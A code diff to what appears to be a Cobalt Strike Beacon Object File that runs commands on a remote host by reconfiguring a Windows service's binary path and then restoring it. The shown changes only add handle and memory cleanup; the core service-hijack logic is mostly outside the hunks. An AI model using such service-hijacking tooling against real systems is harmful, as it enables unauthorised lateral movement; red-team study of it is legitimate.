@@ -13,13 +13,15 @@ DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
 DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
 DECLSPEC_IMPORT BOOL WINAPI Advapi32$QueryServiceConfigA(SC_HANDLE, LPQUERY_SERVICE_CONFIGA, DWORD, LPDWORD);
 DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalAlloc(UINT, SIZE_T);
+DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalFree(HGLOBAL);
 DECLSPEC_IMPORT BOOL WINAPI Advapi32$ChangeServiceConfigA(SC_HANDLE, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR);
 DECLSPEC_IMPORT BOOL WINAPI Advapi32$StartServiceA(SC_HANDLE,DWORD, LPCSTR*);
+DECLSPEC_IMPORT BOOL WINAPI Advapi32$CloseServiceHandle(SC_HANDLE);
 DECLSPEC_IMPORT DWORD WINAPI kernel32$GetLastError();
 DECLSPEC_IMPORT HANDLE WINAPI kernel32$GetCurrentProcess();
+DECLSPEC_IMPORT BOOL WINAPI kernel32$CloseHandle(HANDLE);
 
-void go(char * args, int length)  
-	{
+void go(char * args, int length) {
     // Parse Beacon Arguments
     datap parser;
     CHAR * targetHost;
@@ -63,6 +65,7 @@ void go(char * args, int length)
     BeaconPrintf(CALLBACK_OUTPUT, "Opening %s\n", serviceName);
     SC_HANDLE schService = Advapi32$OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
     if(schService == NULL) {
+	Advapi32$CloseServiceHandle(schManager);
         BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenServiceA failed %ld\n", kernel32$GetLastError());
         kernel32$ExitProcess(0);
     }
@@ -107,4 +110,9 @@ void go(char * args, int length)
         }
         BeaconPrintf(CALLBACK_OUTPUT, "Service path was restored to \"%s\"\n", originalBinaryPath);
     }
+	
+    kernel32$GlobalFree(lpqsc);
+    kernel32$CloseHandle(hToken);
+    Advapi32$CloseServiceHandle(schManager);
+    Advapi32$CloseServiceHandle(schService);
 }
